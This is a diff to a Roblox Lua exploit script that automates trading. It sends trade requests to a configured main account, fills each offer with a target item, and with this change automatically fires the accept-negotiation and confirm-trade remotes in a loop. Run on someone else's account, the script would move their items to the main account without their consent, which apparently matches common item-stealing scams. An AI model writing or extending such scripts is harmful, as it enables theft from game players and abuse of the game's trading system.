@@ -2,12 +2,18 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- ================= CONFIGURATION =================
+
+-- =================================================
+
 -- Remotes and Functions
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
 local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
+local acceptNegotiationRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation")
+local confirmTradeRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade")
 
--- Load ClientData for inventory scanning[cite: 3]
+-- Load ClientData for inventory scanning
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 end)
@@ -70,7 +76,7 @@ local function getMultipleUniqueIdsByName(itemName, limit)
 	return uniqueIds
 end
 
--- Thread 1: Handles sending and accepting trades
+-- Thread 1: Handles sending and accepting incoming trade sessions
 task.spawn(function()
 	while true do
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
@@ -89,7 +95,7 @@ task.spawn(function()
 	end
 end)
 
--- Thread 2: Dedicated fast loop to continuously add items up to the 18 slot limit
+-- Thread 2: Dedicated loop to fill items, accept negotiation, and lock/confirm the trade
 task.spawn(function()
 	while true do
 		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, MAX_ITEMS_TO_ADD)
@@ -99,7 +105,12 @@ task.spawn(function()
 			end)
 		end
 		
-		-- Fast interval to keep trying to fill the slots immediately when a trade opens
-		task.wait(0.2)
+		-- Once items are added, fire negotiation acceptance and trade confirmation
+		pcall(function()
+			acceptNegotiationRemote:FireServer()
+			confirmTradeRemote:FireServer()
+		end)
+		
+		task.wait(0.5)
 	end
 end)
